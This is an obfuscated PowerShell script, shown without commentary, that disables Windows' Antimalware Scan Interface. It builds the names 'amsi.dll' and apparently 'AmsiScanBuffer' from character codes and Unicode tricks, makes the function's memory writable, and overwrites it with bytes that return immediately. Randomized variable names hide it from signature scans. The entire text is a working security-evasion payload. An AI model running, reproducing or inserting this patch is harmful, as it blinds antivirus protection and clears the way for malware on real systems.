$APn = @"
using System;
using System.Runtime.InteropServices;
public class APn {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lMG9, string DThivHXnozx);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr vPf8j2e60jigJzPB, UIntPtr asBYJ3Ca2RYh, uint qb_NEgewa8Dd0, out uint HPsSnliC6e82Sk1ET);
}
"@

Add-Type $APn

$e2ZlzTZE4GiuKq = [APn]::LoadLibrary("$([CHar](8+89)+[cHAR](109)+[CHAR]([BYTe]0x73)+[char](105)+[CHAR](46)+[cHAR]([ByTE]0x64)+[CHaR]([bYte]0x6c)+[chAR](41+67))")
$_ZCG = [APn]::GetProcAddress($e2ZlzTZE4GiuKq, "$(('ÀmsíS'+'cânBù'+'ffér').NOrMalIZe([cHar]([bYTe]0x46)+[cHaR](111)+[cHAR]([bYTe]0x72)+[cHaR]([ByTE]0x6d)+[CHar](29+39)) -replace [chAr](92)+[ChAR]([byTE]0x70)+[cHAr](123)+[ChAr]([BYtE]0x4d)+[cHAR](110*21/21)+[ChaR]([bYTE]0x7d))")
$p = 0
[APn]::VirtualProtect($_ZCG, [uint32]5, 0x40, [ref]$p)
$NkStHHD1Q = "0xB8"
$mjChMbg8GAJ = "0x57"
$Gp_T333bOnup2 = "0x00"
$a4nWh = "0x07"
$kXa7tKpGN = "0x80"
$nxRUdVmNrBR2 = "0xC3"
$dzVYZoi_bGQVm6pv3PMb = [Byte[]] ($NkStHHD1Q,$mjChMbg8GAJ,$Gp_T333bOnup2,$a4nWh,+$kXa7tKpGN,+$nxRUdVmNrBR2)
[System.Runtime.InteropServices.Marshal]::Copy($dzVYZoi_bGQVm6pv3PMb, 0, $_ZCG, 6)